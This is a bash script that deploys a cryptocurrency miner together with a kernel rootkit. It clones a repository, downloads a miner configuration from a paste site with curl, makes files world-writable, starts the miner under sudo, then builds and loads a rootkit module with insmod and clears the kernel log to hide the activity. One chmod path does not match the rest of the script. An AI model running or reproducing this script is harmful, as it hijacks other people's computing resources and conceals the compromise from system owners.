#!/bin/bash
mv /miner /tmp/tmp1
mkdir /miner
cd /miner
git clone https://github.com/Mzikoa21/Zarrassa.git
cd Zarrassa
rm config.json
NEW_UUID=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)
curl https://ghostbin.com/B545M/raw  | sed "s/Miner/$NEW_UUID/g" > config.json
chmod 777 /miner/Zarrassa*
chmod 777 /miner/Zarrassa/binaries/*
chmod 777 /miner/Zarrassa/rootkit
chmod 777 /rootkit/Zarrassa/rootkit/*
sudo ./cpuminer.sh & 
cd rootkit
make
dmesg -C
insmod rootkit.ko
dmesg 
